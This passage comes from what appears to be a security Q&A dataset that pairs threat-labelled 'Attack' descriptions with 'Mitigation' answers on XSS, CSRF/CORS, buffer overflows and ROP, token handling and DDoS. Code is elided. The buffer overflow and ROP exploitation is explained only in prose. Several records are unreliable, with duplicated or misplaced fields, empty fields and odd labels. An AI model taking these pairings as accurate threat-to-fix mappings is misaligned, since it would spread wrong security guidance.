persisting the whole token, you could persist the token identifier (the [LINK] claim) and some metadata (the user you issued the token for, the expiration date, etc) if you need. To find some great resources to work with JWT, have a look at [LINK].Tip: Always consider removing old tokens in order to prevent your database from growing indefinitely.<h2>How to accept a token</h2>You should never accept expired tokens or tokens which were not issued by your application. If you are using JWT, you must check the token signature.Please note, once you issue a token and give it to your client, you have no control over what the client will do with the token. No control. Seriously.It's a common practice to check the [LINK] header field to tell which browser is being used to access your API. However, it's worth mention that HTTP headers can be easily spoofed and you should never trust your client. Browsers don't have unique identifier, but you can get a good level of [LINK] if you want.I don't know about your security requirements, but you always can try the following in your server to enhance the security of your API:Check which browser the user was using when the token was issued. If the browser is different in the following requests, just refuse the token.Get the client remote address (that is, the client IP address) when the token was issued and use a third party API to lookup the client location. If the following requests comes an address from other country, for example, refuse the token. To lookup the location by IP address, you can try free APIs such as [LINK] or [LINK]. Mind that hitting a third party API for each request your API receives is not a good idea and can cause a severe damage to the performance. But you can minimize the impact with a cache, by storing the client remote address and its location. There are a few cache engines available nowadays. To mention a few: [LINK], [LINK], [LINK] and [LINK].When sending sensitive data over the wire, your best friend is HTTPS and it protects your application against the [LINK].By the way, have I mentioned you should never trust your client? "
  },
  {
    "Threat": "I",
    "Attack": "   a third-party code can see the scope in which eval() was invoked,  which can lead to possible attacks in ways to which the similar  Function is not susceptible.    [LINK]  What exactly does \"a third-party code can see the scope in which eval() was invoked\" mean and how does it impact the security of my JS apps? ",
    "Mitigation": " If you wrap all of your code in a closure, secret objects cannot be accessed from the evaluated function body.  [CODE] "
  },
  {
    "Threat": "T",
    "Attack": " If either App (Web) Server 1 or DB Server 1 or both are compromised then attacker will not be able to get any user sensitive data (either encrypted or not). All attacker will have is access to public-key and encryption algorithms which are well known anyway. Attacker will however be able to modify web-server to get currently logged users passwords in plaintext and decrypt part of user sensitive data stored in DB Server 1 (see App Server 1, step 3) which I don't consider as a big deal. Attacker will be able to (via code modification) also intercept user sensitive data entered by users via web during potential attack. Later I consider as a higher risk, but provided that it is hard (is it?) for attacker to modify code without someone noticing I guess I shouldn't worry much about it.  If App Server 2 and private key are compromised then attacker will have access to everything, but App Server 2 or DB Server 2 are not web facing so it shouldn't be a problem. ",
    "Mitigation": " Strongly document and analyse your threat model first  You need to come up with a fixed hard-lined list of all possible attack scenarios. Local attackers, etc, who are you trying to protect against? You also say things like 'with proper key management'; yet this is one of the hardest things to do. So don't just assume you can get this right; fully plan out how you will do this, with specific linking to who it will prevent attacks by.  The reason you need to do a threat model, is that you will need to determine on what angles you will be vulnerable; because this will be the case.  I will also suggest that while the theory is good; in crypto implementation is also very critical. Do not just assume that you will do things correctly, you really need to take care as to where random numbers come from, and other such things.  I know this is a bit vague, but I do think that at least coming up with formal and strong threat model, will be very helpful for you. "
  },
  {
    "Threat": "I",
    "Attack": " I was looking is there any possibility to force an app to use the Android native keyboard instead of a custom one (ie Swift keyboard).   Thinking in terms of security this could be an interesting topic in order to prevent loose of information through fake or malicious keyboards.  ",
    "Mitigation": " Another hint: if you use sensitive text fields you should at least disable auto-correct (and automatic learning of new words) for this field. Otherwise the password could be found in the autocorrect database (which was shared between users on older android versions). "
  },
  {
    "Threat": "E",
    "Attack": " Now, one of our clients wants to allow its users \"single sign-on\" (with SmartCards/Oracle PKI). With this, the user will be able connect to our DB without providing any password every time they start \"ourTool\". But the same will be true for the potentially dangerous tools like SQLplus, Excel, Access, etc.  ",
    "Mitigation": " Since it's your application and you have control of the source, you can use either password protected database roles or Secure Application Roles that are enabled from ourTool.exe.  (see [LINK] ).  For example, with a password-protected database role, the initial connection would be with only the CREATE SESSION privilege, and then ourTool.exe would issue the SET ROLE with password known only to you.  Any other application doesn't  have the information to set the role.  Obviously, the privileges are granted only to the role and not directly to the user in this configuration. "
  },
  {
    "Threat": "I",
    "Attack": " With phishing you think of the traditional e-mail that tries to lure someone onto a specific website, resp. a fake clone of it, to input their login credentials or perform certain actions. ",
    "Mitigation": " Social engineering is a little broader, and includes other forms of getting people to perform certain actions \u9225?might be phone calls, etc. The main part is that the attacker uses information gathered about the person/company that make their request seem genuine. (F.e. employees wiring large amounts of money into foreign accounts because they thought it was their boss instructing them to do so is the kind of case that\u9225\u6a9a making headlines recently.) "
  },
  {
    "Threat": "I",
    "Attack": " I've read a [LINK] of [LINK] on this, but they don't answer my question directly. Developer tools like Firebug allow anyone to see and manipulate form data before a form is sent. A good example of this is adjusting the value of a hidden \"member ID\" field so that the form submission is credited to another user. ",
    "Mitigation": " You can't use jQuery for security since it's all handled on the client side.  In your example just use a PHP session in staed of a hidden input field, because as you rightfully noted this can be manipulated. "
  },
  {
    "Threat": "E",
    "Attack": " During startup, the daemon generates a random 128-byte secret token by reading /dev/urandom. /dev/random is no good because it may block the reader for an arbitrary amount of time.The daemon listens on a Unix domain socket.The daemon puts the secret token and the filename of the socket in environment variables. Every subprocess that it spawns can connect to the daemon using the filename and the secret token.The daemon rejects the connection unless the secret token is correct. ",
    "Mitigation": " Someone mentioned ability to look at process's memory if you have the same UID. You can avoid that by making kernel think it's a setuid-process, i.e. if the master process runs as root you can fork, exec and setuid() to unprivileged user. Other processes with same UID won't be able to look at that process's memory then. "
  },
  {
    "Threat": "E",
    "Attack": " I have such situation. Imagine there is a public REST service. What we don't want, is for someone, to be able to access this service many times in short period of time, because they will be able to block our database (essentially a DDOS attack, I presume?). ",
    "Mitigation": "   Declarative approach of throttling control over the Spring services.  @Throttling annotation helps you to limit the number of service method  calls per java.util.concurrent.TimeUnit for a particular user, IP  address, HTTP header/cookie value, or using Spring Expression Language  (SpEL).  Obviously this wouldn't prevent DDOS attacks at the web server level, but it would help limit access to long running queries or implement a fair usage policy. "
  },
  {
    "Threat": "T",
    "Attack": " Here is an example of a hack someone could do on Android to allow the user to unintentionally press a system button property or even enter in credentials to do something completely different then the initial intention: ",
    "Mitigation": " write this code for critical buttons "
  },
  {
    "Threat": "I",
    "Attack": " This is to mitigate cross-site scripting risk; imagine your website has an XSS vuln -- for example I can put [CODE] into a comment, and any user who views my comment will have my code running in their browser. Yes, the attacker's code is running inside the victim's logged-in browser, but because of the [CODE] flag, it can't extract the session cookie and send it to the attacker. ",
    "Mitigation": " There are many ways to combine them, but they all boil down to putting the JWT in some sort of authentication header, and putting a sessionID in the cookie, and having the server check that these belong to the same session. Important: remember that an attacker who achieves XSS on your site will be able to read the JWT, so for the cookie to be doing its job, the cookie should be a separate value that is not contained in the JWT. (ie if the attacker can figure out the right cookie value by looking at the JWT, then the cookie is not providing any security). "
  },
  {
    "Threat": "E",
    "Attack": "   When a buffer has a certain size, fill the buffer and an add additional code so that the attacker can execute another function in the code or his/her own shellcode.  A ROP attack is one kind of payload you can deliver via a buffer-overflow vulnerability, for buffers on the stack.  (Overflowing other buffers could let you overwrite other data, e.g. in a struct or nearby other globals, but not take control of the program-counter.)<hr />A buffer overflow is when incorrect bounds checking or handling of implicit-length data (e.g. [CODE] or [CODE]) lets malicious input write memory past the end of an array.  This gets interesting when the array was allocated on the call-stack, so one of the things following it is the return address of this function.(In theory overwriting a static variable past the end of a static array could be useful as an exploit, and that would also be a buffer overflow.  But usually a buffer overflow implies a buffer on the stack, allowing the attacker to control the return address.  And thus to gain control of the instruction pointer.)As well as a new return address, your malicious data will include more data which will be in memory below and above that return address.  Part of this is the payload.  Controlling the return address alone is usually not sufficient: in most processes there isn't anywhere you can jump to that (without other inputs) will [CODE] a shell listening on a TCP port, for example.Traditionally your payload would be machine-code (&quot;shellcode&quot;), and the return address would be the stack address where you knew that payload would land.  (+- a NOP slide so you didn't have to get it exactly right).Stack ASLR and non-executable stacks have made the traditional shellcode injection method of exploiting a buffer overflow impossible in normal modern programs.  &quot;Buffer overflow attack&quot; used to (I think) imply shellcode injection, because there was no need to look for more complicated attacks.  But that's no longer true.<hr />A ROP attack is when the payload is a sequence of return addresses and data to be popped by [CODE] instructions, and/or some strings like [CODE].  The first return address in the payload sends execution to some already-existing bytes at a known address in an executable page.<hr />and try to execute the function [CODE] by giving a certain input to [CODE] function.The code for [CODE] already exists in the target program, so the simplest attack would be a ROP attack.This is the absolute simplest form of ROP attack, where code to do exactly what you want exists at a single known address, without needing any &quot;function args&quot;.  So it makes a good example to introduce the topic.Is this a ROP attack or a buffer overflow attack?It's both.  It's a buffer overflow to inject a ROP payload.If the program was compiled with [CODE], you could also choose to inject e.g. x86 shellcode that did [CODE] / [CODE] to jump to the known absolute address of [CODE].  In that case it would be a buffer overflow but not a ROP attack; it would be a code-injection attack.(You might not call it &quot;shellcode&quot; because the purpose isn't to run a shell replacing the program, but rather to do something using the existing code of theprogram.  But terminology is often used sloppily, so I think many people would call any injectable machine code &quot;shellcode&quot; regardless of what it does.)<hr />Buffer overflow attack:When a buffer has a certain size, fill the buffer and an add additional code so that the attacker can execute another function in the code or his/her own shellcode.The &quot;in the code&quot; option would be a ROP attack.  You point the return address at code which is already in memory.The &quot;or his/her own shellcode&quot; option would be a code-injection attack.  You point the return address at the buffer you just overflowed.  (Either directly or via a ret2reg ROP attack to defeat stack ASLR, by looking for a [CODE] gadget on x86 for example.)This &quot;Buffer Overflow&quot; definition is still slightly too narrow: it excludes overwriting some other critical variable (like [CODE]) without overwriting a return address.But yes, code injection and ROP attacks are the 2 main ways, with code injection normally made impossible by non-executable stack memory. ",
    "Mitigation": " A ROP attack is one kind of payload you can deliver via a buffer-overflow vulnerability, for buffers on the stack.  (Overflowing other buffers could let you overwrite other data, e.g. in a struct or nearby other globals, but not take control of the program-counter.)<hr />A buffer overflow is when incorrect bounds checking or handling of implicit-length data (e.g. [CODE] or [CODE]) lets malicious input write memory past the end of an array.  This gets interesting when the array was allocated on the call-stack, so one of the things following it is the return address of this function.(In theory overwriting a static variable past the end of a static array could be useful as an exploit, and that would also be a buffer overflow.  But usually a buffer overflow implies a buffer on the stack, allowing the attacker to control the return address.  And thus to gain control of the instruction pointer.)As well as a new return address, your malicious data will include more data which will be in memory below and above that return address.  Part of this is the payload.  Controlling the return address alone is usually not sufficient: in most processes there isn't anywhere you can jump to that (without other inputs) will [CODE] a shell listening on a TCP port, for example.Traditionally your payload would be machine-code (&quot;shellcode&quot;), and the return address would be the stack address where you knew that payload would land.  (+- a NOP slide so you didn't have to get it exactly right).Stack ASLR and non-executable stacks have made the traditional shellcode injection method of exploiting a buffer overflow impossible in normal modern programs.  &quot;Buffer overflow attack&quot; used to (I think) imply shellcode injection, because there was no need to look for more complicated attacks.  But that's no longer true.<hr />A ROP attack is when the payload is a sequence of return addresses and data to be popped by [CODE] instructions, and/or some strings like [CODE].  The first return address in the payload sends execution to some already-existing bytes at a known address in an executable page.<hr />and try to execute the function [CODE] by giving a certain input to [CODE] function.The code for [CODE] already exists in the target program, so the simplest attack would be a ROP attack.This is the absolute simplest form of ROP attack, where code to do exactly what you want exists at a single known address, without needing any &quot;function args&quot;.  So it makes a good example to introduce the topic.Is this a ROP attack or a buffer overflow attack?It's both.  It's a buffer overflow to inject a ROP payload.If the program was compiled with [CODE], you could also choose to inject e.g. x86 shellcode that did [CODE] / [CODE] to jump to the known absolute address of [CODE].  In that case it would be a buffer overflow but not a ROP attack; it would be a code-injection attack.(You might not call it &quot;shellcode&quot; because the purpose isn't to run a shell replacing the program, but rather to do something using the existing code of theprogram.  But terminology is often used sloppily, so I think many people would call any injectable machine code &quot;shellcode&quot; regardless of what it does.)<hr />Buffer overflow attack:When a buffer has a certain size, fill the buffer and an add additional code so that the attacker can execute another function in the code or his/her own shellcode.The &quot;in the code&quot; option would be a ROP attack.  You point the return address at code which is already in memory.The &quot;or his/her own shellcode&quot; option would be a code-injection attack.  You point the return address at the buffer you just overflowed.  (Either directly or via a ret2reg ROP attack to defeat stack ASLR, by looking for a [CODE] gadget on x86 for example.)This &quot;Buffer Overflow&quot; definition is still slightly too narrow: it excludes overwriting some other critical variable (like [CODE]) without overwriting a return address.But yes, code injection and ROP attacks are the 2 main ways, with code injection normally made impossible by non-executable stack memory. "
  },
  {
    "Threat": "I",
    "Attack": " To give some context or an example: in my app, I need to distinguish between content that is posted by the signed in user and the content that was posted by others. In a naive approach, I would just compare the [CODE] of the content to the [CODE] of the currently authenticated user. But that would mean that the client sees the Ids of all involved users. ",
    "Mitigation": " If user IDs are themselves sensitive data,for example, your primary keys for some reason happen to be social security numbers, that'll definitely be a security and privacy liability. If your user IDs are just auto-increment numbers though, it should be fine.  It is always best to expose a unique identifier other than the primary key outside your system. It gives you more flexibility in resolving data mix-ups, dealing with data migration issues, and in otherwise future-proofing your system.  If UIDs are just identifiers for users. Knowing a user's UID does not grant you any permissions that are associated with that user. Sharing the UID in URLs is about as safe as sharing your username on Github, or your unique ID on Stack Overflow. "
  },
  {
    "Threat": "E",
    "Attack": " My concern is that if anyone just review the request headers, the bearer token could easily be discovered. That would allow the user to do any harmful request from any rest client. ",
    "Mitigation": " The solution you are considering with the date and hash does not add any security against a basic adversary.  The expiry of tokens should be managed on the server side in the database.The Oauth 2 threat model tells you how to protect your tokens in [LINK]. "
  },
  {
    "Threat": "I",
    "Attack": "",
    "Mitigation": " NB:  To others, please note that a variable in a stored procedure will not expand into code even if it contains a ' or ;, (excluding passing it to EXECUTE, for which you would use [CODE], not hand-rolled [CODE] functions) so replacing ; or ' is totally unnecessary (in the stored procedure, the application using it is a different story, of course) and would prevent you from always finding the \"[CODE]\" or \"[CODE]\" teams. "
  },
  {
    "Threat": "I",
    "Attack": " I've used iframes before, but never when dealing with private data, so i'm not very familiar with the security risks attached to using iframes. A lot of the examples i found after googling were risks attached to hackers adding iframes with their own destination to existing code, as opposed to harmfully use an existing one. What should I look out for and try to prevent from happening? ",
    "Mitigation": " To start, your best solution is probably to use a subdomain pointing to your server hosting the app. So Company A can have their regular web site on [CODE] but have the application on [CODE].  Regarding frames, I don't think in your situation there are any security \"risks\" to worry about. The iframe will belong to you and you control it. Javascript's Same Origin Policy prevents frames on different domains (and subdomains unless [CODE] is set) from accessing each other. So the iframe won't be able to access the parent and vice-versa.  However I'm assuming the application is free standing and doesn't rely on anything from the parent site. In which case, everything would happen in the frame and there's no need for the frames to communicate in any way.  The disadvantage of frames of course is that the apparent URL and page title will remain the same when you load new pages in the iframe, which is bad usability (and bad for SEO, if that is a concern). "
  },
  {
    "Threat": "I",
    "Attack": " The so called 'vulnerability' only occurs if the [CODE] value relies on data injected by something external (directly or indirectly) AND is shown on a page where other users than the attacker are affected.In other words this is NOT an issue if all your [CODE] attributes are made of hardcoded html text. It is also generally not an issue if this page is only seen by the attacker (self-hack ...).For example you could also say jQuery [CODE] is a vulnerability, which is a more obvious case, but still vulnerable to XSS if you are a total web beginner or just did not pay attention.So in general, avoid injecting unescaped user data in third-party: popups, tool-tips, ... or anything where DOM is directly manipulated behind the scenes.I personally do not consider this a big vulnerability, but it is nicer if a famous framework like bootstrap handles this case or explicitly names the method as unsafe to warn developers.Chrome audit considers bootstrap 3.3.x a vulnerability ([LINK]):Includes front-end JavaScript libraries with known security vulnerabilities[LINK][LINK] ",
    "Mitigation": " The so called 'vulnerability' only occurs if the [CODE] value relies on data injected by something external (directly or indirectly) AND is shown on a page where other users than the attacker are affected.In other words this is NOT an issue if all your [CODE] attributes are made of hardcoded html text. It is also generally not an issue if this page is only seen by the attacker (self-hack ...).For example you could also say jQuery [CODE] is a vulnerability, which is a more obvious case, but still vulnerable to XSS if you are a total web beginner or just did not pay attention.So in general, avoid injecting unescaped user data in third-party: popups, tool-tips, ... or anything where DOM is directly manipulated behind the scenes.I personally do not consider this a big vulnerability, but it is nicer if a famous framework like bootstrap handles this case or explicitly names the method as unsafe to warn developers.Chrome audit considers bootstrap 3.3.x a vulnerability ([LINK]):Includes front-end JavaScript libraries with known security vulnerabilities[LINK][LINK] "
  },
  {
    "Threat": "E",
    "Attack": " Someone may say that once there is rogue software on a computer, nothing is safe, therefore it's useless to worry about it.  I'd still rather take steps to minimize potential damage caused by an attacker gaining access to encryption keys for personal data. ",
    "Mitigation": " There have been many religious arguments about this, however I'll just make the answer as clear as possible from a practical sense: if 'rogue software', ie malware, is running with the privileges to access the memory space of your decryption program, it can not only read the keys, but the data that you decrypt. Surely that's more of an issue - since that's what the key protects, after all. You're not going to stop the user from viewing their own data, are you? So then you're not adding any security.  To put it another way, the tennets of computability are supplementing, not replacing, the rules of security on the host platform. The two add together, and both are needed for security. Without host security on the decrypting machine, you can't have cryptographic security. Attempts to add it just add more complexity and increase the likelihood that you'll introduce a real bug (although .NET does your memory management for you, so that's less of an issue here). "
  },
  {
    "Threat": "I",
    "Attack": " How to prevent a DDoS attack on my app which will send try to send a sms every time (even if the number is not valid)? ",
    "Mitigation": " There are a couple things that you should attempt.First and foremost you should try to reduce probability of a DDOS attack by enabling captcha.While it will make DDOS attack difficult, it will not make it impossible. In order to prevent actual DDOS attack you will need to NOT execute SMS requests instantly and put them in a queue instead. By having a separate process with well defined rate-limits and displaying &quot;message may take up to 15 minutes to arrive&quot; on your website, you will make resource exhaustion a lot more difficult to create.Last but not least, do phone number validation prior to sending messages and keep track of how many requests were sent to a certain number within last 30 minutes. Limit number of requests for unique number to maybe 2 requests per 30 mintues. "
  },
  {
    "Threat": "I",
    "Attack": " The only threat I can see here is if someone gain access to computer with app installed and retrieves from config files all those information needed to establish connection and authenticate it. ",
    "Mitigation": " SQL Server and SQL Azure support encryption for database connections (encryption in motion).  Please be aware that SSL is the older term for this - the current best capability supported to talk to the SQL engine (in either context) is TLS 1.2.  Note that you need to have the right (up to date) versions of client drivers to be able to get this security when talking to SQL Azure.  SQL Azure enforces encryption by default when using these drivers.  You can read the current state of this in this post:[LINK]  With respect to your broader question, there are lots of things you need to consider when writing an application (2 tier or 3 tier).  You should be looking at the firewall on Azure SQL DB to lock down whatever path you enable.  You should use the SQL permission model to limit what each user/role can do when operating in the database.  You should use audit to track who connects to the db (and from where).  You should make sure you are using TDE (on by default in SQL Azure for new DBs).  There are additional security features in SQL that may also be useful to you (row level security, data masking, always encrypted, etc).  The networking part is really just the starting point for designing a secure solution. "
  },
  {
    "Threat": "E",
    "Attack": " ASP.Net Core has protection against brute force guessing of passwords, by locking the account after a fixed number of login attempts.  But is there some protection against credential stuffing, where the attacker tries a lot of logins, but always with different usernames? Locking the account would not help, since the account changes on every attempt. But maybe there is a way to lock an IP against multiple login-attempts or some other good idea to prevent credential stuffing? ",
    "Mitigation": " I'd recommend using velocity checks with redis, this is basically just throttling certain IPs. Also some fraudsters will also rotate IPs, you could also detect when logins are happening more frequently (say 10x the norm) and start to block all logins for that short window. I wrote a blog post detailing some of the above. The code is all in node, but I did give some high level examples of how we stop fraud at Precognitive (my current gig). I will continue to build upon the code over the next couple of months as I post more in my Account Takeover series. "
  },
  {
    "Threat": "T",
    "Attack": "   I'm surprised there hasn't been more discussion of those who want to introduce malicious code. This is a real question: Is there no way in Python to prevent a black-hat hacker from accessing your variables and methods and inserting code/data that could deny service, reveal personal (or proprietary company) informationQ1? If Python doesn't allow this type of security, should it ever be used for sensitive dataQ2? ",
    "Mitigation": " In the end all this gets compiled into a big ball of bytes anyway, and all the data is stored in memory at runtime. At that point there is no protection of individual memory offsets within the application's scope anyway, it's all just byte soup. [CODE] and [CODE] are constraints the programmer imposes on their own code to keep their own logic straight. For this purpose, more or less informal conventions like [CODE] are perfectly adequate.  An attacker cannot attack at the level of individual properties. The running software is a black box to them, whatever goes on internally doesn't matter. If an attacker is in a position to actually access individual memory offsets, or actually inject code, then it's pretty much game over either way. [CODE] and [CODE] doesn't matter at that point. "
  },
  {
    "Threat": "D",
    "Attack": " the user code is still running on your server. It might be not possible to escape the docker image, but a malicious user could still upload for eg. a denial of service tool and start an attack from your server. Or sniff your network traffic or whatever. there are or at least might be ways to break out of the docker image. ",
    "Mitigation": " For a controlled environment like a classroom those risks might be acceptable, but for a public server you would need a lot of security know how to further lock down the server and the docker image and filter available python functionality. "
  },
  {
    "Threat": "E",
    "Attack": " The goal is not to protect the webpage user from accessing the script variable (this cannot be done I guess). The goal is more to guarantee that the memory of the javascript engine does not keep shadow/cached copies of the data, after the point necessary. I do want to have the data be gone so that no-one (attacker software) can get the secret data via looking at the memory been associated with the Javascript Variables. ",
    "Mitigation": " One possible solution would be to run the whole program within a VM that uses encrypted RAM, but I'm against rolling your own crypto like that. Generally, an attacker should not have access to your program's RAM in the first place, if they do, they can install a browser extension :) "
  },
  {
    "Threat": "I",
    "Attack": " If your JVM is running untrusted or unknown code that might try to do bad things, then the reflection APIs in general offer lots of opportunities to do bad things.  For example, it allows the bad code to call methods and access fields that the Java compiler would prevent.  (It even allows the code to do evil things like changing the value of [CODE] attributes and other things that are normally assumed to be immutable.)Even if your JVM is running entirely trusted code, it is still possible that a design flaw or system-level security problem may allow the injection of class or method names by a hacker.  The reflection APIs would then dutifully attempt to invoke unexpected methods. ",
    "Mitigation": " The simple solution: if you are running trusted code, or if you are worried about the possibility of design flaws comprising security, run all relevant code in a security sandbox that prevents use of the reflection APIs.  (The downside is that some 3rd-party libraries are designed under the assumption that they can use reflection ... and will break in a sandbox.) "
  },
  {
    "Threat": "D",
    "Attack": " What's the point to prevent DDOS attacks from people downloading malicious flash software.  It doesn't seem to protect the flash users at all only third party websites, especially as that's circumventable with a proxy it seems to render the whole thing pointless. ",
    "Mitigation": " Flash files execute on the users machine in a trusted environment. Without crossdomain files a swf could take a guess at internal services, anything behind a firewall, that the user has access to but a SWF should not. This is a major security risk. While there are other reasons for the policy this is by far the most important reason. So you are correct it is annoying that it is needed to access public api's but its better than it accessing private api's, imagine corporate directory services, just because the content is running on your machine. "
  },
  {
    "Threat": "I",
    "Attack": " So, the problem: Since the bootstrapper effectively transfers program execution to a method on the IEngine object, a malicious IEngine implementation (or impersonator) that somehow found its way to the application's scanned folders could basically wreak total havoc on the server if it got loaded and was found to be the most eligible engine version. ",
    "Mitigation": " Assemblies can be digitally signed with a private key. The result is called a [LINK].When a strong named assembly is loaded, .NET automatically checks whether its signature matches the embedded public key. So when a strong named assembly has been loaded, you have the guarantee that the author posseses the private key that corresponds to that public key.You can get the public key by calling [LINK][LINK][LINK] and then compare it to the expected one, i.e. yours.You can scan over the plugin assemblies, create an [CODE] for each one with the right public key (rejecting the others), finally aggregating them into an [CODE] and building a [CODE] with it.This is basically what Glenn Block also explained in [LINK]. (Best ignore the  blog post linked there by Bnaya, his interpretation of [CODE] is not correct.)edit with responses to the wall of comments:To get that public key, I make theconsole application output the publickey byte array to somewhere. I embedthe byte array in my host application,and subsequently use that to compareagainst the public keys of plugincandidates. Would that be the way todo it?Yes, but there is a simpler way to extract the public key. Look at the [CODE] option of [LINK].Does this mechanism automatically prevent a malicous plugin assembly from exposing acorrect, but &quot;faked&quot; public key? As in, is there some mechanism to disqualify any assemblythat is signed, but has a mismatch between its exposed public key and it's internalprivate key, from being loaded/run at all?As far as I know, the check happens automatically. A strong named assembly cannot be loaded (even dynamically) if its signature is wrong. Otherwise the strong name would be useless. To test this, you can open your strong named assembly in a hex editor, change something (like a character in a [CODE] embedded in the assembly) and verify that the assembly can no longer be loaded.I guess what I was referring to was something akin to the type of hack/crack described here:[LINK]and here: [LINK][...snip more comments...]However, this can - apparently - be bypassed by simple tampering (as shown in first link, &gt; and explained more here): grimes.demon.co.uk/workshops/fusionWSCrackOne.htmThe &quot;attacks&quot; you refer to fall in three categories:removing the strong name altogether. This does not break the authentication, the assembly will no longer have a public key and so you will reject it.disabling the strong name check, which requires full access to the machine. If this was done by an attacker, then it would mean that the attacker already owns your machine. Any security mechanism would be meaningless in such a context. What we are actually defending against is an attacker between the machine and the source of the assemblies.a real exploit made possible by a bug in .NET 1.1 that has since been fixedConclusion: strong names are suitable to use for authentication (at least since .NET 2.0) "
  },
  {
    "Threat": "I",
    "Attack": " It does seem like these errors are triggered by external attack attempts but I'm clueless about why they'd be able to inject the exact location of the socket running my Django app in the HTTP HOST header. Any ideas about how this error can be avoided, is this exposing a likely vulnerability on my site?  ",
    "Mitigation": " Edits to do in [CODE] file (usually in [CODE] on Debian based systems)  You could just bypass this request attempt on this specific address by telling Nginx to drop it.  [CODE]  Or you can simply negates incoming connections from this suspicious User-Agent  [CODE] "
  },
  {
    "Threat": "E",
    "Attack": " My concern is that the API Key is embedded within each copy of the mobile app, which means there's no way we can keep it secret. It will be on thousands of phones, and theoretically any hacker with a binary editor or HTTP Traffic analyzer could extract the API key and then 'pose as' one of the applications, sending us requests that we'd have no choice but to trust. Client certificates would appear to have the same risk.  ",
    "Mitigation": " The only way to solve a problem could be to employ cryptographic device (smartcard or USB cryptotoken) which keeps private and secret keys and doesn't let them out, however with handhelds use of such devices is quite complicated (if not impossible) from both technical and usability points of view.   Also you might want to reconsider your approach and let any client software use the service given that they pay for it. And your server will authenticate users and not software. Then the topic of keeping login data secret will be users' task.  "
  },
  {
    "Threat": "I",
    "Attack": "   Vega has detected that the resource has set an insecure Cross-Origin  Resource Sharing (CORS) access control. CORS provides mechanisms that  allow a server to restrict resource access for cross-site requests to  certain trusted domains. The server in question has allowed resource  from any origin by setting the value of the  \"Access-Control-Allow-Origin\" response header to a wildcard value.  This presents a security risk because any site can issue requests to  access resources, regardless of origin. ",
    "Mitigation": " Again note here, the attacker is not stealing your data, they are instead trying to make forged requests in your name to steal your money / whatever. This is not a [CODE] attack (MITM), it is a request forgery attack. In a CSRF, the attacker doesn't see or need to see your data, they just find a way to act as though they were you. The subsequent purpose of this might to get at your data, e.g change your password etc, but the attack itself is about making forged requests, it's not about interception.  So one way the bank can secure itself and its' customers is by specifically stating what sites may and may not make requests to it via [CODE] headers.  And if they don't specifically include www.cutekittens.com, then even if the attacker manages to inject their malicious script into a page on the www.cutekittens.com site, and even if you happen to be surfing both cutekittens and your bank site at the same, and even if the attack script is executed, the request to www.yourbank.com will be dropped (after preflight for a POST) because the bank has not sent down a header to the browser [CODE] to specifically authorise the request.  And so you're right. All you've done by replacing the static [CODE] value for this header with the dynamic [CODE] is get Vega off your back. Your site is still potentially vulnerable to this attack if it's been poorly written because it will reflect back www.cutekittens.com which is presumably not what you want.  One reason you'd use the [CODE] instead of [CODE] is when you want to send credentials to the server. You can't send credentials e.g. cookies etc on a CORS AJAX request, to a server using only [CODE] and so in this case you'd dynamically reflect back the origin to the client.   But then by doing this you really need to make sure you're mitigating risk in other ways. In this case, you'd also typically white list what you will and won't reflect back. e.g. portal.mybank.com might be on the list but www.cutekittens.com would not. So that would be the next step you could implement, if you're going to use dynamic origin reflection. "
  },
  {
    "Threat": "I",
    "Attack": " you realize that because your code receives the unencrypted data from the user's browser, you do have access to the data in memory before it is encrypted on disk, or when it is unencrypted when the user wants to use that data later. And bad people could get access to that data if they root your box, sneak something into a Ruby [CODE], etc. ",
    "Mitigation": " Encrypting the data does help a lot, though. SQL injection attacks can't get the decrypted data, for example. "
  },
  {
    "Threat": "E",
    "Attack": " The malicious code would then steal some cookies perhaps (if those are not set [LINK]) and immediately post them via ajax to a backend application..which would probably notify the attacker and who knows..those cookies might be enough to login into that website as the victim. ",
    "Mitigation": " set httponly in cookies you use to authenticate usersuse htmlentities when printing user input back to your outputuse mysql_real_escape_string before storing user input into your dbdo not perform critical actions (i.e. save/delete/modify articles) using GET requests..use POST for those (xsrf). "
  },
  {
    "Threat": "I",
    "Attack": " If I understand it correctly, an app's memory is saved to flash storage if it resigns active. Assume a resourceful hacker that is able to read out this memory. Will he theoretically sometimes be able to read out the contents of a dealloced [CODE] if that memory hasn't been overwritten with something? ",
    "Mitigation": " Don't store secure data in Objective C data types.  They are opaque data types, and could be making and/or leaving lots of copies of your data in memory every time you try to even clear some portion.  Added: The same appears to be true about Swift data types, including structs, arrays and strings.  They are opaque, thus who knows how many copies of data might be left around in DRAM.  Use non-opaque plain C data types (array of chars, etc.), which you can bzero as soon as you are finished using them, and whenever the app resigns being active.  You could also obfuscate the array elements to make string searching through memory dumps a little more difficult. "
  },
  {
    "Threat": "E",
    "Attack": "",
    "Mitigation": " The simplest approach for protecting against unwanted malicious program input is to simply run it in a separate VM. If you're on Linux, boot up a VM using KVM or something, run the program there, and have the output logged somewhere (over a virtual serial port, for example). Give the VM no network access and wipe its drive each time. "
  },
  {
    "Threat": "E",
    "Attack": " I plan to use those functions in web-environment, so my concern is if those functions can be exploited and used for executing malicious software on the server.  [CODE] and [CODE] could most definitely be used for an attack if the attacker can control their input and the output is executed. In most cases, you are going to either [CODE] or [CODE] their output to make it run so those are still the usual suspects and [CODE] and [CODE] (deprecated BTW) are just adding another step between the malicious input and the execution.  ",
    "Mitigation": " EDIT: Just saw that you left a comment indicating that you are actually planning on using these on USER INPUT. Don't do that. Or at least, don't actually execute the result. That's a huge security hole for whoever ends up running that code. And if nobody's going to run it, why compile it? Since you clarified that you only want to check syntax, this should be fine. I would not store the output though as there's no reason to make anything easier for a potential attacker and being able to get arbitrary code onto your system is a first step.  If you do need to store it, I would probably favor a scheme similar to that commonly used for images where they are renamed in a non-predictable manner with the added step of making sure that it is not stored on the import path. "
  },
  {
    "Threat": "I",
    "Attack": "",
    "Mitigation": " Just use a proper password authentication approach, and no-one will be able to break anything unless they know the password (regardless of where the HTTP requests are coming from).  Once you have reliable server-side authentication, you don't need to waste time jumping through non-robust hoops worrying about this scenario. "
  },
  {
    "Threat": "E",
    "Attack": "   Random salts have a tremendous benefit. If all accounts in the system use the same salt, an attacker can brute-force calculate hashes for that salt and break into all accounts with just one computational run. ",
    "Mitigation": "   if you thought \"why is the salt included in the hash and is it save  when i store it as it is in my db?\"    Answer i found: The salt just has to be unique. It not meant to be a  secret.    As mentioned in notes and docu before: let password_hash() take care  of the salt.    With the unique salt you force the attacker to crack the hash. The  hash is unique and cannot be found at rainbow tables. "
  },
  {
    "Threat": "E",
